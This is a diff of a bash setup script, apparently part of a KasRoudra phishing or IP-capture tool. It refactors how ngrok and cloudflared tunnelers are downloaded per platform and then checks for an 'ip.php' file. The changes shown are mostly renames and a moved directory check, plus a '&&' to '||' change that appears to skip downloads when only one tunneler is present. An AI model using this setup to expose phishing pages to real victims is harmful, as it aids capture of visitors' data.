@@ -217,43 +217,42 @@ if [ `pidof ngrok > /dev/null 2>&1` ]; then
 fi
 
 
-# Termux should run from home
-if $termux; then
-    path=`pwd`
-    if echo "$path" | grep -q "home"; then
-        printf ""
-    else
-        echo -e "${error}Invalid directory. Run from home!\007\n"
-        killer; exit 1
-    fi
-fi
 
-# Download tunnlers
-if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
+# Download tunnelers
+if ! [[ -f $HOME/.ngrokfolder/ngrok || -f $HOME/.cffolder/cloudflared ]] ; then
+    # Termux should run from home
+    if $termux; then
+        if echo "$cwd" | grep -q "home"; then
+            printf ""
+        else
+            echo -e "${error}Invalid directory. Run from home!\007\n"
+            exit 1
+        fi
+    fi
     if ! [[ -d $HOME/.ngrokfolder ]]; then
         cd $HOME && mkdir .ngrokfolder
     fi
     if ! [[ -d $HOME/.cffolder ]]; then
         cd $HOME && mkdir .cffolder
     fi
-    p=`uname -m`
-    d=`uname`
+    arch=`uname -m`
+    platform=`uname`
     while true; do
-.       cd "$cwd"
         echo -e "\n${info}Downloading Tunnelers:\n"
         netcheck
         if [ -e ngrok.zip ];then
             rm -rf ngrok.zip
         fi
-        if echo "$d" | grep -q "Darwin"; then
-            if echo "$p" | grep -q "x86_64"; then
+        cd "$cwd"
+        if echo "$platform" | grep -q "Darwin"; then
+            if echo "$arch" | grep -q "x86_64"; then
                 wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O "cloudflared.tgz"
-                tar -zxf cloudflared.tgz
+                tar -zxf cloudflared.tgz > /dev/null 2>&1
                 rm -rf cloudflared.tgz
                 break
-            elif echo "$p" | grep -q "arm64"; then
+            elif echo "$arch" | grep -q "arm64"; then
                 wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
                 ngrokdel
                 echo -e "${error}Cloudflared not available for device architecture!"
@@ -264,8 +263,8 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
                 sleep 3
                 break
             fi
-        elif echo "$d" | grep -q "Linux"; then
-            if echo "$p" | grep -q "aarch64"; then
+        elif echo "$platform" | grep -q "Linux"; then
+            if echo "$arch" | grep -q "aarch64"; then
                 if [ -e ngrok-stable-linux-arm64.tgz ];then
                    rm -rf ngrok-stable-linux-arm64.tgz
                 fi
@@ -274,12 +273,12 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
                 rm -rf ngrok.tgz
                 wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
                 break
-            elif echo "$p" | grep -q "arm"; then
+            elif echo "$arch" | grep -q "arm"; then
                 wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
                 break
-            elif echo "$p" | grep -q "x86_64"; then
+            elif echo "$arch" | grep -q "x86_64"; then
                 wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
@@ -307,6 +306,7 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
     chmod +x $HOME/.cffolder/cloudflared
     fi
 fi
+
 
 # Check for crucial file ip.php
 if ! [ -e ip.php ]; then
